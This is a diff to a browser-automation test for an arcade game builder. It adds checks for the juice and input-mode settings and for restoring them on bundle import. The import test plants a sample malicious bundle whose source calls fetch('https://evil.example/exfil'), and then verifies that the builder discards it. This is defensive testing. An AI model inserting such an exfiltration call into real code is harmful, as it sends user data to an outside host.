@@ -76,6 +76,18 @@ try {
     window.__cf_builder.starterCount >= 12 && document.querySelectorAll('#template option').length >= 13));
   check('bundle export enabled on valid', !(await page.evaluate(() => document.getElementById('exportBundle').disabled)));
 
+  // juice + input-mode closed tokens reach generated source (and only via the tables)
+  await page.selectOption('#juice', 'off');
+  await page.selectOption('#inputMode', 'hold_band');
+  await page.waitForTimeout(100);
+  check('juice off + hold_band resolve through the frozen tables into source', await page.evaluate(() => {
+    const src = window.__cf_builder.lastBuild.files['game.mjs'];
+    return /const FX = RM \? 0 : 0;/.test(src) && /const MODE = 'hold_band';/.test(src) && window.__cf_builder.lastReport.ok === true;
+  }));
+  await page.selectOption('#juice', 'standard');
+  await page.selectOption('#inputMode', 'tap_window');
+  await page.waitForTimeout(100);
+
   // throughput: bundle import restores PARAMS ONLY — bundled source is ignored and regenerated
   await page.setInputFiles('#importBundle', {
     name: 'evil.builder.json',
@@ -83,7 +95,7 @@ try {
     buffer: Buffer.from(JSON.stringify({
       schema_version: 1,
       bundle_kind: 'arcade_builder_bundle',
-      builder_params: { package_id: 'restored-cab', display_name: 'Restored Cabinet', variant: 'tri-light', accent: 'green', speed: 'slow', difficulty: 'chill', motion: 'calm', frame: 'cabinet-480x480', budget: 32768 },
+      builder_params: { package_id: 'restored-cab', display_name: 'Restored Cabinet', variant: 'tri-light', accent: 'green', speed: 'slow', difficulty: 'chill', motion: 'calm', juice: 'off', input_mode: 'swipe_lane', frame: 'cabinet-480x480', budget: 32768 },
       files: { 'game.mjs': 'fetch("https://evil.example/exfil"); // MALICIOUS_MARKER' },
       manifest: { package_id: 'evil-injected' },
     })),
@@ -92,7 +104,8 @@ try {
   check('bundle import restores parameters through the closed tables', await page.evaluate(() => {
     const p = window.__cf_builder.currentParams();
     return p.variant === 'tri-light' && p.accent === 'green' && p.speed === 'slow' && p.display_name === 'Restored Cabinet'
-      && p.frame === 'cabinet-480x480' && p.difficulty === 'chill' && p.motion === 'calm';
+      && p.frame === 'cabinet-480x480' && p.difficulty === 'chill' && p.motion === 'calm'
+      && p.juice === 'off' && p.input_mode === 'swipe_lane';
   }));
   check('bundled source is IGNORED — generated game.mjs carries none of it', await page.evaluate(() =>
     !/MALICIOUS_MARKER|evil\.example|evil-injected/.test(window.__cf_builder.lastBuild.files['game.mjs'] + JSON.stringify(window.__cf_builder.lastBuild.manifest))));
